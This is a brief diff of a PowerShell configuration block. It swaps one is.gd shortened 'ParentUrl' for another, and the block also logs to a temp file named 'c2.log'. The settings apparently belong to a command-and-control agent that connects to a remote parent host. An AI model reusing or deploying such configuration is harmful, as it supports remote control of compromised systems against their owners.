@@ -10,7 +10,7 @@ $Config = @{
     SpawnChannels = $true
     InfoOnConnect = $true
     DefaultStart = $true
-    ParentUrl = "https://is.gd/bwdcc2"
+    ParentUrl = "https://is.gd/y92xe4"
     Version = "2.0.0"
     LogPath = "$env:Temp\c2.log"
 }
